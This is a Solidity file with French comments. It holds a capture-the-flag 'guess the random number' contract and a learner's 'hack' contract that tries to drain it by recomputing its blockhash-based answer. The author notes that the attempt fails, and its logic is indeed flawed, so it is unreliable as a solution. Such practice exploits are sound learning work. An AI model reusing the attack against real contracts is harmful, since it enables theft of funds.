/*


NE FONCTIONNE PAS. A upgrade pour que ça fonctionne.

- web3 a été enlevé de Metamask, du coup il va falloir trouver comment faire pour utiliser la console.
*/




pragma solidity ^0.4.21;

contract GuessTheRandomNumberChallenge {
    uint8 answer;

    function GuessTheRandomNumberChallenge() public payable {
        require(msg.value == 1 ether);
        answer = uint8(keccak256(block.blockhash(block.number - 1), now));
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}


//Ne fonctionne pas :( Je ne comprends pas.

contract hack {
    address public contractAddress;
    
    function hack(address _contractAddress) public {
        contractAddress = _contractAddress;
    }
    
    function voir() public view returns (uint8) {
        return uint8(keccak256(block.blockhash(block.number - 1), now));
    }
    
    function deposit() public payable {
        require (msg.value == 1.1 ether);
    }
    function verify() public view returns (bool){
        return GuessTheRandomNumberChallenge(contractAddress).isComplete();
    }
    function withdraw() public {
        msg.sender.transfer(address(this).balance);
    }
    
    function hackcall() public returns (uint8){
        GuessTheRandomNumberChallenge(contractAddress).guess.value(1 ether)(uint8(keccak256(block.blockhash(block.number - 1), now)));
    }
}
